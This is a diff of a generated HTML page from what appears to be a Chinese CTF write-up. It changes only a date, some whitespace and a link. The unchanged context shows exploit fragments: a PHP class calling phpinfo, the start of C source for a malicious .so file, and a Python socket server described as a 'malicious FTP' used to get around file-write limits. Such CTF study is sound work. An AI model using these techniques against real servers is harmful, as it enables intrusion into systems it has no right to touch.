@@ -536,7 +536,7 @@ class Check &amp;#123;
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-11-08
+                    2021-11-18
                 </div>
                 
 
@@ -595,7 +595,7 @@ class Check &amp;#123;
         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
             <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">;</span>
             <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>  
+        <span class="token punctuation">&#125;</span>
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span>
 
@@ -647,7 +647,7 @@ class Check &amp;#123;
 
 <p>但问题是，写不了文件。</p>
 <p>看了看WP，才发现以前做过类似……没想起来真的不应该。</p>
-<p>具体可参考<a href="https://syunaht.com/p/4276277983.html#toc-heading-2">刷题笔记:[蓝帽杯 2021]One Pointer PHP</a></p>
+<p>具体可参考<a href="/p/4276277983.html#toc-heading-2">刷题笔记:[蓝帽杯 2021]One Pointer PHP</a></p>
 <h4 id="写入-so文件"><a href="#写入-so文件" class="headerlink" title="写入.so文件"></a>写入.so文件</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
@@ -678,7 +678,7 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
 
 <h4 id="开启恶意ftp"><a href="#开启恶意ftp" class="headerlink" title="开启恶意ftp"></a>开启恶意ftp</h4><p>注意修改端口。</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
-s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> 
+s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
 s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#这里是ftp的端口</span>
 s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
